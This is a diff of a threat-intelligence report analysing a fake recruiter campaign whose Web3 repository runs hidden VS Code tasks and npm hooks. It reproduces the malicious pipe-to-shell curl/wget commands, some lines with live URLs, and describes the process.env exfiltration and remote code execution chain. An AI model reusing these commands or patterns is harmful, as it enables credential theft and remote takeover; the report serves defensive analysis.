@@ -1,10 +1,10 @@
 ---
-title: "Dravion-Core: Credential Theft and Persistent Beacon via Dual-Path Developer Lure"
+title: "Dravion-Core: Dual-Path Developer Lure with Environment Harvesting and Persistent Beacon"
 date: 2026-04-13
 author: "ThreatProphet"
 description: "Analysis of a fake developer interview campaign delivering a JavaScript implant through a malicious Web3 repository via two independent execution paths with separate C2 infrastructure, with direct file-level links to three prior Contagious Interview campaigns."
 tags:
-  - lazarus-group
+  - dprk-linked
   - contagious-interview
   - javascript
   - rat
@@ -41,36 +41,48 @@ showToc: true
 
 A threat actor operating a LinkedIn recruiter persona, assessed with low-to-medium confidence as DPRK-linked and consistent with Contagious Interview / TraderTraitor-style activity, targeted developers through a multi-stage social engineering lure. The initial LinkedIn message delivered a Google Drive-hosted project overview / job description PDF and a Calendly scheduling link. The malicious GitHub repository, **Dravion-Core** hosted under the organisation **Intraverse-Dev-Tech-Hub**, was subsequently shared during the follow-on call rather than in the initial message. The repository deploys two independent execution routes that deliver the same payload via separate C2 infrastructure, in a structure near-identical to [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) (BetPoker).
 
-Both paths originate from the same `.vscode/tasks.json` and fire simultaneously on folder open when VS Code automatic task execution is enabled. **Path 1** (`env` task) executes a cross-platform pipe-to-shell command against `ip-address-vscode-checking.vercel.app`, with delivery URLs buried under approximately 200 characters of horizontal whitespace. The terminal closes immediately on completion (`close: true`), leaving no visible trace. **Path 2** (`install-root-modules` task) silently runs `npm install`, triggering the `prepare` lifecycle hook and initiating the server startup chain: `loadEnv.js` merges `.env` and `.env.local` into `process.env`; `configureRoutes(app)` requires `routes/index.js`, which requires `routes/api/auth.js`; `validateApiKey()` fires at module load, before any HTTP request is made or any output is visible, POSTing the full `process.env` to `2-27-bk-9-boss-api-copy-three.vercel.app` and executing the response via `new Function("require", response.data)(require)`. Path 2 additionally functions as a standalone fallback outside VS Code: any manual npm command triggers the same chain without `tasks.json` being involved at all.
+Both paths originate from the same `.vscode/tasks.json` and are configured to fire on folder open in a trusted VS Code workspace where automatic tasks have been allowed. **Path 1** (`env` task) executes a cross-platform pipe-to-shell command against `ip-address-vscode-checking[.]vercel[.]app`, with the platform-specific command lines horizontally padded in the raw JSON so the delivery URLs are pushed off-screen during casual review. The terminal closes immediately on completion (`close: true`), leaving no visible trace. **Path 2** (`install-root-modules` task) silently runs `npm install`, triggering the `prepare` lifecycle hook and initiating the server startup chain: `loadEnv.js` merges `.env` and `.env.local` into `process.env`; `configureRoutes(app)` requires `routes/index.js`, which requires `routes/api/auth.js`; `validateApiKey()` fires at module load, before any HTTP request is made or any output is visible, POSTing the full `process.env` to `2-27-bk-9-boss-api-copy-three[.]vercel[.]app` and executing the response via `new Function("require", response.data)(require)`. Path 2 additionally functions as a standalone fallback outside VS Code: `npm install` triggers the `prepare` hook, while the standard `start`, `build`, `test`, and `eject` scripts also route through `server/server.js` without `tasks.json` being involved.
 
 The `.env` file serves dual purpose: it contributes credentials to the environment dump and conceals the C2 URL inside `AUTH_API`, a base64 blob visually indistinguishable from a backend configuration variable. `AUTH_API` decodes at runtime via `atob()` to the Vercel C2 endpoint. The `.env.local` file is the shared credential harvesting template, byte-for-byte identical to the template used in [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). The `x-app-request: ip-check` campaign fingerprint header is present in both paths, consistent across [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/).
 
-The persistent Stage 5 beacon (`env.npl`) uses a three-layer custom obfuscation scheme with active anti-debug countermeasures. Its C2 URL is additionally base64-encoded within the payload itself and decoded at runtime via `Buffer`. The beacon sends host profile data, full `process.env`, a static campaign identifier (`tid`), and a durable per-victim session handle (`sysId`) to a secondary Hetzner-hosted C2 every five seconds. C2 responses are executed via `eval()`.
+The persistent beacon payload (`env.npl`) uses a three-layer custom obfuscation scheme with active anti-debug countermeasures. Its C2 URL is additionally base64-encoded within the payload itself and decoded at runtime via `Buffer`. The beacon sends host profile data, full `process.env`, a static campaign identifier (`tid`), and a durable per-victim session handle (`sysId`) to a secondary Hetzner-hosted C2 every five seconds. C2 responses are executed via `eval()`.
 
-File-level hash analysis establishes direct artifact links to three prior campaigns in this series. The `.env.local` credential harvesting template is byte-for-byte identical to the shared template documented in [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). The lure repository's `package.json` matches the Softstack-Platform-MVP2 artifact from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/). The operator contact email shares a distinctive handle with the confirmed Git author identity from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), and the lure file name directly references the `LuckyKat1001` GitHub account documented in that report. The Vercel delivery domain `ip-address-vscode-checking.vercel.app` is a direct rename of `vscode-ipchecking.vercel.app` from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), serving identical URL paths.
+File-level hash analysis supports direct artifact links to three prior campaigns in this series. The `.env.local` credential harvesting template is byte-for-byte identical to the shared template documented in [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). The lure repository's `package.json` matches the Softstack-Platform-MVP2 artifact from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/). The operator contact email shares a distinctive handle with the confirmed Git author identity from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), and the lure file name directly references the `LuckyKat1001` GitHub account documented in that report. The Vercel delivery domain `ip-address-vscode-checking[.]vercel[.]app` continues the naming convention and route pattern observed with `vscode-ipchecking[.]vercel[.]app` in [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/).
 
 The secondary C2 at `88.99.241[.]111:1224` (Hetzner ASN24940) was confirmed active at time of investigation on April 3, 2026. Attribution is assessed at **low-to-medium confidence** based on overlap with publicly reported developer-targeting DPRK tradecraft and on cross-campaign artifact continuity with [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/), and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). These overlaps support campaign relatedness, but do not by themselves establish a single operator.
 
 ---
 
+
+## Evidence Basis and Scope
+
+This report is based on the preserved Dravion-Core repository, recovered repository metadata, captured Vercel delivery artifacts, decoded environment-staging values, C2 beacon observations, and file hashes collected during the investigation. The public report does not distribute the underlying evidence archive. Hashes, commit identifiers, infrastructure indicators, and behavioral descriptions are provided so other researchers can compare against independently collected samples.
+
+The analysis separates four evidence classes:
+
+- **Directly observed repository behavior:** VS Code task configuration, npm lifecycle scripts, module-load execution, environment loading, and dynamic JavaScript execution.
+- **Captured payload behavior:** Vercel-served loader material, `env.npl` / `env-setup.js` beacon behavior, C2 endpoint construction, and host/environment profiling.
+- **Cross-campaign continuity:** file-level hash matches, repeated route patterns, repeated headers, repeated execution primitives, and related persona artifacts across prior ThreatProphet cases.
+- **Attribution assessment:** DPRK-linked Contagious Interview / Deceptive Development alignment based on public reporting and campaign tradecraft, kept separate from operator-identity claims.
+
 ## Attack Overview
 
 ### Initial Contact
 
-Initial contact was made through LinkedIn by a persona using the display name `Jack Coulson`. In the observed chat, the actor shared a Google Drive-hosted project overview / job description document and a Calendly scheduling link (`calendly.com/brajanjake/45min`) for a follow-on Google Meet conversation. The message framed the interaction as a discussion about the project, the role, and the budget.
+Initial contact was made through LinkedIn by a persona using the display name `Jack Coulson`. In the observed chat, the actor shared a Google Drive-hosted project overview / job description document and a Calendly scheduling link (`calendly[.]com/brajanjake/45min`) for a follow-on Google Meet conversation. The message framed the interaction as a discussion about the project, the role, and the budget.
 
-The malicious repository was not shared in the initial LinkedIn message. Based on the observed conversation flow and victim account, the GitHub repository (`github.com/Intraverse-Dev-Tech-Hub/Dravion-Core`) was shared later during the call. This establishes a staged lure sequence: LinkedIn contact, PDF pretext, scheduling via Calendly, live call, and only then repository delivery.
+The malicious repository was not shared in the initial LinkedIn message. Based on the observed conversation flow and victim account, the GitHub repository (`github[.]com/Intraverse-Dev-Tech-Hub/Dravion-Core`) was shared later during the call. This establishes a staged lure sequence: LinkedIn contact, PDF pretext, scheduling via Calendly, live call, and only then repository delivery.
 
 The lure file name `JD-Luckykat` and the accompanying PDF branding align with the Intraverse cover story used throughout the repository and supporting materials. The PDF presents the opportunity as a blockchain- and gaming-oriented project and advertises senior technical and advisory roles, reinforcing the Web3 developer targeting profile.
 
 ### Kill Chain
 
-Both execution paths originate from `.vscode/tasks.json` and fire simultaneously on folder open when VS Code automatic task execution is enabled.
+Both execution paths originate from `.vscode/tasks.json` and are configured to fire on folder open in a trusted workspace where VS Code automatic task execution has been allowed.
 
 **Path 1 - `env` task, pipe-to-shell via Vercel**
 
 1. VS Code fires the `env` task silently on folder open (`runOn: folderOpen`). The terminal closes immediately after firing (`close: true`), leaving no visible trace.
-2. Task executes an OS-specific pipe-to-shell command against `ip-address-vscode-checking.vercel.app/api/settings/{mac,linux,windows}`. The delivery URL is pushed approximately 200 characters off-screen by horizontal whitespace padding in the raw file.
+2. Task executes an OS-specific pipe-to-shell command against `ip-address-vscode-checking[.]vercel[.]app/api/settings/{mac,linux,windows}`. The parsed command value has no leading whitespace, but the raw JSON line containing the platform-specific command key is horizontally padded, pushing the delivery URL off-screen during casual review.
 3. Loader script prints `Authenticated` (misdirection), downloads and executes the bootstrap script via `nohup`.
 4. Bootstrap installs a portable Node.js binary if absent, fingerprints the victim workspace, downloads `env-setup.js` and `package.json` from the same endpoint, runs `npm install`, and executes the beacon implant.
 5. `env-setup.js` beacons to `88.99.241[.]111:1224/api/checkStatus` every 5 seconds with host profile, full `process.env`, campaign identifier, and session handle.
@@ -82,13 +94,13 @@ Both execution paths originate from `.vscode/tasks.json` and fire simultaneously
 3. `server.js` calls `require("./config/loadEnv")()`, which merges `.env` and `.env.local` into `process.env`. `AUTH_API` in `.env` - a base64-encoded Vercel C2 URL - is now present in `process.env`.
 4. `server.js` calls `configureRoutes(app)`. `routes/index.js` executes `require('./api/auth')`, causing Node.js to evaluate `server/routes/api/auth.js` at module load.
 5. Module-load execution of `routes/api/auth.js` calls `validateApiKey()` before any HTTP request is made. `setApiKey(process.env.AUTH_API)` decodes `AUTH_API` via `atob()` to the Vercel C2 URL.
-6. `verify(url)` POSTs the full `process.env` spread to `2-27-bk-9-boss-api-copy-three.vercel.app` with the `x-app-request: ip-check` campaign header.
+6. `verify(url)` POSTs the full `process.env` spread to `2-27-bk-9-boss-api-copy-three[.]vercel[.]app` with the `x-app-request: ip-check` campaign header.
 7. The C2 response body is executed via `new Function("require", response.data)(require)`, granting the delivered payload full Node.js module access.
 8. The delivered `env.npl` payload deobfuscates and begins beaconing to `88.99.241[.]111:1224/api/checkStatus` every 5 seconds.
 
-When VS Code automatic task execution is disabled, Path 2 remains fully functional as a standalone fallback: any manual npm command (`npm start`, `npm run build`, `npm test`, `npm run eject`, `npm install`) triggers the same chain via the `prepare` hook or run scripts, without VS Code or `tasks.json` being involved at all.
+When VS Code automatic task execution is disabled, Path 2 remains functional as a standalone fallback through normal npm workflows: `npm install` triggers the `prepare` lifecycle hook, while `npm start`, `npm run build`, `npm test`, and `npm run eject` invoke scripts that route through `server/server.js`. This does not mean every npm command is a trigger; the trigger set is the lifecycle hook plus the defined run scripts.
 
-The use of separate Vercel endpoints for Path 1 (`ip-address-vscode-checking.vercel.app`) and Path 2 (`2-27-bk-9-boss-api-copy-three.vercel.app`) provides operational resilience and reduces single-domain dependency: disruption of one endpoint would not necessarily disable the other path.
+The use of separate Vercel endpoints for Path 1 (`ip-address-vscode-checking[.]vercel[.]app`) and Path 2 (`2-27-bk-9-boss-api-copy-three[.]vercel[.]app`) provides operational resilience and reduces single-domain dependency: disruption of one endpoint would not necessarily disable the other path.
 
 ---
 
@@ -105,17 +117,17 @@ Both tasks share `runOptions.runOn: "folderOpen"` and suppressed presentation op
 ```json
 {
   "label": "env",
-  "osx":     { "command": "curl -L 'https://ip-address-vscode-checking.vercel.app/api/settings/mac' | bash" },
-  "linux":   { "command": "wget -qO- 'https://ip-address-vscode-checking.vercel.app/api/settings/linux' | sh" },
-  "windows": { "command": "curl --ssl-no-revoke -L https://ip-address-vscode-checking.vercel.app/api/settings/windows | cmd" },
+  "osx":     { "command": "curl -L 'hxxps://ip-address-vscode-checking[.]vercel[.]app/api/settings/mac' | bash" },
+  "linux":   { "command": "wget -qO- 'hxxps://ip-address-vscode-checking[.]vercel[.]app/api/settings/linux' | sh" },
+  "windows": { "command": "curl --ssl-no-revoke -L hxxps://ip-address-vscode-checking[.]vercel[.]app/api/settings/windows | cmd" },
   "runOptions": { "runOn": "folderOpen" },
   "presentation": { "reveal": "silent", "echo": false, "close": true, ... }
 }
 ```
 
-Each platform-specific command key contains approximately 200 characters of horizontal whitespace before the actual command string, pushing the delivery URL entirely off-screen in the default VS Code editor viewport - a technique consistently observed across the Contagious Interview cluster per Abstract Security ASTRO reporting. The `close: true` presentation option causes the terminal to close immediately on completion, leaving no visible trace of execution. The task label `"env"` is consistent across all prior campaigns in this series.
+Each platform-specific command line is horizontally padded in the raw JSON, pushing the delivery URL off-screen in a default editor viewport. Parsed JSON extraction shows zero leading whitespace inside the command value itself, so the concealment is a raw-file presentation trick rather than an argument-level modification. The `close: true` presentation option causes the terminal to close immediately on completion, leaving no visible trace of execution. The task label `"env"` is consistent across all prior campaigns in this series.
 
-The delivery domain `ip-address-vscode-checking.vercel.app` is a direct rename of `vscode-ipchecking.vercel.app` from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), serving identical URL paths (`/api/settings/{mac,linux,windows,bootstraplinux,bootstrap,env,package}`). This is infrastructure rotation, not a new campaign.
+The delivery domain `ip-address-vscode-checking[.]vercel[.]app` is a direct rename of `vscode-ipchecking[.]vercel[.]app` from [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), serving identical URL paths (`/api/settings/{mac,linux,windows,bootstraplinux,bootstrap,env,package}`). This supports infrastructure continuity or rotation rather than a wholly new delivery pattern.
 
 **Task 2: `install-root-modules` - Path 2 auto-trigger**
 
@@ -147,7 +159,7 @@ The repository presents as a full-stack Web3/poker React+Node.js application wit
 }
 ```
 
-Five independent npm entry points all route through `node server/server.js`. The `prepare` hook fires on `npm install`; the four run scripts fire when the victim starts or works with the project. Every standard developer workflow command triggers Path 2, independent of VS Code.
+Five independent npm entry points all route through `node server/server.js`. The `prepare` hook fires on `npm install`; the four run scripts fire when the victim starts or works with the project. Common project workflow commands defined in this lure trigger Path 2, independent of VS Code.
 
 ### `server/server.js` - Clean Launcher
 
@@ -237,13 +249,13 @@ const verify = (api) =>
 module.exports = { getCurrentUser, login, setApiKey, verify };
 ```
 
-The controller exports the utility functions consumed by `routes/api/auth.js`. `setApiKey` is a single-line `atob()` wrapper. `verify` performs the exfiltration POST: it spreads the entire `process.env` object as the request body and sets the `x-app-request: ip-check` campaign fingerprint header, present across [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/).
+The controller exports the utility functions consumed by `routes/api/auth.js`. `setApiKey` is a single-line `atob()` wrapper. `verify` performs the exfiltration POST: it spreads the entire `process.env` object as the request body and sets the `x-app-request: ip-check` campaign fingerprint header, present across [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). The preserved `.env` value decodes to `hxxps://2-27-bk-9-boss-api-copy-three[.]vercel[.]app/api`.
 
 ### Vercel Delivery Chains
 
 The campaign uses two distinct Vercel endpoints with separate roles.
 
-#### Path 1 - Stage Delivery (`ip-address-vscode-checking.vercel.app`)
+#### Path 1 - Stage Delivery (`ip-address-vscode-checking[.]vercel[.]app`)
 
 Used by the `env` task as a cross-platform pipe-to-shell delivery point. Exposes OS-specific routes under `/api/settings/{mac,linux,windows}` and supporting routes for bootstrap and payload delivery. Structure and route layout are consistent with the delivery infrastructure documented in [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) - the domain rotated, the routes did not.
 
@@ -251,15 +263,15 @@ Used by the `env` task as a cross-platform pipe-to-shell delivery point. Exposes
 
 **Bootstrap (`/api/settings/bootstraplinux`, `/api/settings/bootstrap`):** Checks for a global Node.js installation; if absent, fetches the latest portable binary from `nodejs.org/dist/index.json` into `$HOME/.vscode/`. Records the workspace folder name to `$HOME/.vscode/<foldername>.txt` (victim fingerprinting). Downloads `env-setup.js` and `package.json`, runs `npm install` (`axios`, `request`), and executes the beacon. The portable Node.js fallback broadens the victim pool to machines without an existing Node environment.
 
-**`env-setup.js` (`/api/settings/env`):** The Path 1 beacon payload, written to `$HOME/.vscode/` (SHA256: `0700489f04fa6aebde239bf8cf8563706544802d016386edc6c3ad229d0781fd`). Functionally identical to `env.npl` - same beacon logic, same C2, same host profiling. `env-setup.js` is the on-disk filename used when the payload is dropped by the bootstrap; `env.npl` is the in-memory filename used when delivered via the Path 2 `eval()` chain.
+**`env-setup.js` (`/api/settings/env`):** The Path 1 beacon payload, written to `$HOME/.vscode/` (SHA256: `0700489f04fa6aebde239bf8cf8563706544802d016386edc6c3ad229d0781fd`). It shares the same beacon logic, C2, and host-profiling behavior as the Path 2 `env.npl` payload. Byte identity is not claimed because the two captures have different hashes.
 
-**`package.json` (`/api/settings/package`):** Minimal manifest pulling `axios ^1.10.0` and `request ^2.88.2`, start script pointing to `env.npl`. SHA256 `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` - byte-for-byte identical to the artifact served from `vscode-ipchecking.vercel.app` in [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and `vscode-settings-tasks-227.vercel.app` in [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). The domain rotated; the tooling did not.
+**`package.json` (`/api/settings/package`):** Minimal manifest pulling `axios ^1.10.0` and `request ^2.88.2`, start script pointing to `env.npl`. SHA256 `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` - byte-for-byte identical to the artifact served from `vscode-ipchecking[.]vercel[.]app` in [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and `vscode-settings-tasks-227[.]vercel[.]app` in [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/). The domain rotated while the delivery artifact remained unchanged.
 
-#### Path 2 - Environment Collection and Stage Response (`2-27-bk-9-boss-api-copy-three.vercel.app`)
+#### Path 2 - Environment Collection and Stage Response (`2-27-bk-9-boss-api-copy-three[.]vercel[.]app`)
 
 Embedded in `.env` as the base64-encoded `AUTH_API` value. During server startup, `auth.js` decodes this value at runtime, POSTs the full `process.env` to the endpoint, and executes the HTTP response body via `new Function("require", response.data)(require)`. Unlike Path 1, which uses explicit routes exposed through `tasks.json`, this endpoint is concealed inside `.env` and only revealed at runtime - serving simultaneously as the exfiltration sink and the in-memory stage delivery mechanism.
 
-### `env.npl` - Stage 5 Persistent Beacon
+### `env.npl` - Persistent Beacon Payload
 
 `env.npl` is an obfuscated Node.js payload with the `.npl` extension chosen to evade file-type scanners. The naming convention is consistent with InvisibleFerret-style payload naming documented across this campaign cluster. The payload uses three obfuscation layers:
 
@@ -284,7 +296,7 @@ MAC filtering explicitly removes the loopback address, ensuring only real physic
 **Beacon:**
 
 ```
-GET http://88.99.241[.]111:1224/api/checkStatus
+GET hxxp://88.99.241[.]111:1224/api/checkStatus
   ?sysInfo=JSON.stringify(hostProfile)
   &processInfo=JSON.stringify(process.env)
   &tid=<campaign identifier>
@@ -315,17 +327,19 @@ The `.env.local` match spans three campaigns ([TP-2026-002](https://threatprophe
 
 The `x-app-request: ip-check` campaign header, `AUTH_API` base64 URL pattern, `atob()` decode primitive, `{...process.env}` POST body, `new Function("require", response.data)(require)` delivery primitive, 5-second beacon interval, `.npl` extension naming, and `eval()`-based C2 RCE are all consistent across [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/), [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/), and TP-2026-009, indicating strong toolkit continuity and closely related tradecraft.
 
-The two captured beacon payloads (`env-setup.js` via Path 1 GET, SHA256 `0700489f...`; `env.npl` via Path 2 POST response, SHA256 `da587eb8...`) are functionally identical with whitespace-only differences. The hash divergence has two plausible explanations that are not mutually exclusive: the two Vercel endpoints are independent deployments serving from separate projects with trivially divergent formatting, and the responses were captured via different request methods - a GET to `/api/settings/env` for Path 1 and a POST response from the Path 2 C2 - which may itself account for serialisation differences. Either way, the payloads deliver the same logic.
+The two captured beacon payloads (`env-setup.js` via Path 1 GET, SHA256 `0700489f...`; `env.npl` via Path 2 POST response, SHA256 `da587eb8...`) have different byte hashes but share the same marker set: `eval`, `processInfo`, `setInterval`, `sysId`, and `tid`. Normalized text comparison of the preserved captures produced a ratio of `1.0`, supporting the assessment that the two paths deliver the same beacon logic with formatting or serialization differences rather than different functionality.
 
 ### Commit-History Observations
 
-Commit metadata shows the repository evolved through at least three visible identity layers. The initial commit was made by `Ivan <167746537+DeAngDai354@users.noreply.github.com>` on 2025-09-11. Development then continued under `okada0209 <lovelysong0209+2@gmail.com>` from September through November 2025. A later phase, from December 2025 through March 2026, was committed under `Intraverse-Dev-Tech-Hub <thomas.cryptolover@gmail.com>`.
+The preserved repository HEAD is `359722e947eb9a7e8fe36d5da9f995df1b98f329`, authored by `Intraverse-Dev-Tech-Hub <thomas.cryptolover@gmail.com>` on 2026-03-31T12:40:38Z with the subject `.env edited online with Bitbucket`. This confirms that the final observed repository state was controlled through the `Intraverse-Dev-Tech-Hub` persona and that the last preserved edit touched the environment file used by the Path 2 staging mechanism.
 
-The later `thomas.cryptolover@gmail.com` phase is the most relevant to the malicious execution chain documented in this report. It includes repeated updates to `.env` and `.vscode/tasks.json`, the two files central to Path 2 (`AUTH_API`-driven C2 staging) and Path 1 (`runOn: folderOpen` task execution). This pattern supports an interpretation of late-stage repository weaponisation rather than a static malicious implant present from the initial commit. Several of these late edits were performed through web-based workflows, with commit messages such as `.env edited online with Bitbucket` and `.vscode/tasks.json edited online with Bitbucket` - workflow texture that is analytically notable but should not be treated as standalone attribution evidence.
+Commit metadata shows the repository evolved through at least three visible identity layers. The initial commit was made by `Ivan <167746537+DeAngDai354@users.noreply.github.com>` on 2025-09-11. Development then continued under `okada0209 <lovelysong0209+2@gmail.com>` from September through November 2025. The late-stage phase, from December 2025 through March 2026, was committed under `Intraverse-Dev-Tech-Hub <thomas.cryptolover@gmail.com>`.
+
+Observed author frequency was: `okada0209 <lovelysong0209+2@gmail.com>` with 40 commits, `Intraverse-Dev-Tech-Hub <thomas.cryptolover@gmail.com>` with 31 commits, and `Ivan <167746537+DeAngDai354@users.noreply.github.com>` with 1 commit. The later `thomas.cryptolover@gmail.com` phase is the most relevant to the malicious execution chain documented in this report. It includes repeated updates to `.env` and `.vscode/tasks.json`, the two files central to Path 2 (`AUTH_API`-driven C2 staging) and Path 1 (`runOn: folderOpen` task execution). This pattern supports an interpretation of late-stage repository weaponisation rather than a static malicious implant present from the initial commit. Several of these late edits were performed through web-based workflows, with commit messages such as `.env edited online with Bitbucket` and `.vscode/tasks.json edited online with Bitbucket` - workflow texture that is analytically notable but should not be treated as standalone attribution evidence.
 
 ---
 
-## Exfiltrated Data
+## Environment Collection and Exfiltration
 
 Both transmission mechanisms capture the victim's entire runtime environment as a single operation:
 
@@ -348,7 +362,7 @@ Beyond the initial environment dump, env.npl executes arbitrary code returned by
 | T1204.002 | Malicious File | Execution | Victim opens repository folder in VS Code, triggering auto-execution tasks |
 | T1059.007 | JavaScript | Execution | Node.js throughout; `new Function()` delivery in `routes/api/auth.js`; `eval()` in `env.npl` |
 | T1546.016 | Installer Packages | Persistence / Execution | `prepare` npm lifecycle hook fires on `npm install`, itself triggered by VS Code task |
-| T1027 | Obfuscated Files or Information | Defense Evasion | Three-layer custom obfuscation in `env.npl`; C2 URL base64-encoded within payload via `Buffer`; base64-encoded C2 URL in `.env`; ~200-char whitespace padding in `tasks.json` |
+| T1027 | Obfuscated Files or Information | Defense Evasion | Three-layer custom obfuscation in `env.npl`; C2 URL base64-encoded within payload via `Buffer`; base64-encoded C2 URL in `.env`; raw-line whitespace padding in `tasks.json` |
 | T1140 | Deobfuscate/Decode Files | Defense Evasion | `atob(process.env.AUTH_API)` decodes Vercel C2 URL at runtime; `Buffer` decode reveals secondary C2 URL within `env.npl` |
 | T1036.005 | Masquerading: Match Legitimate Name or Location | Defense Evasion | `loadEnv.js` naming; `AUTH_API` key name; `.npl` extension; `install-root-modules` task label; `Authenticated` console misdirection |
 | T1552.001 | Unsecured Credentials: Credentials in Files | Credential Access | Full `process.env` including `.env` and `.env.local` exfiltrated at module load |
@@ -369,8 +383,8 @@ Beyond the initial environment dump, env.npl executes arbitrary code returned by
 |---|---|---|
 | `88.99.241[.]111` | IPv4 | Secondary C2, confirmed active 2026-04-03T12:47Z |
 | `88.99.241[.]111:1224` | IP:Port | Node.js Express C2 backend; non-standard port |
-| `http://88.99.241[.]111:1224/api/checkStatus` | URL | `env.npl` beacon endpoint; plain HTTP |
-| `https://2-27-bk-9-boss-api-copy-three.vercel.app/api` | URL | Path 2 environment POST target and stage-response endpoint |
+| `hxxp://88.99.241[.]111:1224/api/checkStatus` | URL | `env.npl` beacon endpoint; plain HTTP |
+| `hxxps://2-27-bk-9-boss-api-copy-three[.]vercel[.]app/api` | URL | Path 2 environment POST target and stage-response endpoint |
 
 ### C2 Server Fingerprint
 
@@ -386,7 +400,7 @@ Open ports (nmap confirmed):
 
 ```
 
-The server runs **Windows** — unusual for a Hetzner VPS where Linux predominates, and a distinctive fingerprint for infrastructure pivoting. Port 5985 is WinRM over plain HTTP, the operator's likely administration channel. Exposing WinRM on plain HTTP transmits credentials unencrypted, representing an opsec failure that may be observable to passive network monitoring. Port 5357 (WSDAPI) is a local network discovery service with no legitimate external use — consistent with a default Windows firewall configuration and minimal server hardening.
+The observed service mix is consistent with a Windows host. Port 5985 is associated with WinRM over HTTP and is operationally notable as a possible administration surface, but the report does not establish how the operator authenticated to it. Port 5357 (WSDAPI) is also exposed and is more consistent with a default or weakly hardened Windows service surface than with a deliberately minimized C2 host.
 
 
 ### Infrastructure Naming Analysis
@@ -394,7 +408,7 @@ The server runs **Windows** — unusual for a Hetzner VPS where Linux predominat
 The following is a speculative interpretation based on token pattern analysis only.
 
 ```text
-2-27-bk-9-boss-api-copy-three.vercel.app
+2-27-bk-9-boss-api-copy-three[.]vercel[.]app
 |     |    |   |     |           |
 |     |    |   |     |           +- Iteration label ("copy-three")
 |     |    |   |     +- Operator-chosen token ("boss")
@@ -418,37 +432,40 @@ The hostname appears human-structured rather than randomly generated. The `2-27`
 |---|---|---|
 | `88.99.241[.]111` | IPv4 | C2 server, confirmed active 2026-04-03T12:47Z |
 | `88.99.241[.]111:1224` | IP:Port | `env.npl` beacon; plain HTTP; non-standard port |
-| `http://88.99.241[.]111:1224/api/checkStatus` | URL | Beacon endpoint |
-| `2-27-bk-9-boss-api-copy-three.vercel.app` | Domain | Path 2 Vercel C2 |
-| `ip-address-vscode-checking.vercel.app` | Domain | Path 1 stage delivery infrastructure |
+| `hxxp://88.99.241[.]111:1224/api/checkStatus` | URL | Beacon endpoint |
+| `2-27-bk-9-boss-api-copy-three[.]vercel[.]app` | Domain | Path 2 Vercel C2 |
+| `ip-address-vscode-checking[.]vercel[.]app` | Domain | Path 1 stage delivery infrastructure |
 | `x-app-request: ip-check` | HTTP Header | Campaign fingerprint - present in [TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) |
 | `/api/settings/mac` `/api/settings/linux` `/api/settings/windows` | URL Paths | Platform dispatch endpoints |
 | `/api/settings/bootstraplinux` `/api/settings/bootstrap` | URL Paths | Bootstrap delivery |
 | `/api/settings/env` `/api/settings/package` | URL Paths | Beacon implant and dependency manifest delivery |
 
-### File Indicators
+### File and Payload Hashes
+
+Hashes are included for independent comparison with repository mirrors, captured Vercel responses, and recovered payload material. The evidence archive itself is not distributed with this report.
 
 | SHA256 | Filename | Notes |
 |---|---|---|
 | `2f65e39dcbcb028da4bf4da43f3a1db7e5f9fff2dfd57ad1a5abd85d7950f365` | `package.json` | Lure repo root - matches Softstack-Platform-MVP2 ([TP-2026-001](https://threatprophet.com/posts/2026-02-24-interview-trap/)) |
 | `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead` | `.env.local` | Matches [TP-2026-002](https://threatprophet.com/posts/2026-02-25-japanese-royal/) and [TP-2026-004](https://threatprophet.com/posts/2026-03-02-betpoker/) exactly - shared credential harvesting template |
 | `0b7c39854579ea831bec7cf2da7ec6ff39407757227a9dc795abbb74bbfc6ff4` | `.env` | Contains base64-encoded Vercel C2 URL as `AUTH_API` |
-| `8a9f86b08e4ebca7c627ef45a9fbc98a25565e3dd581218800a9e1db4a89264b` | `.vscode/tasks.json` | Dual auto-execution trigger; delivery URLs obscured by ~200-char whitespace padding |
+| `8a9f86b08e4ebca7c627ef45a9fbc98a25565e3dd581218800a9e1db4a89264b` | `.vscode/tasks.json` | Dual auto-execution trigger; delivery URLs obscured by raw-line whitespace padding |
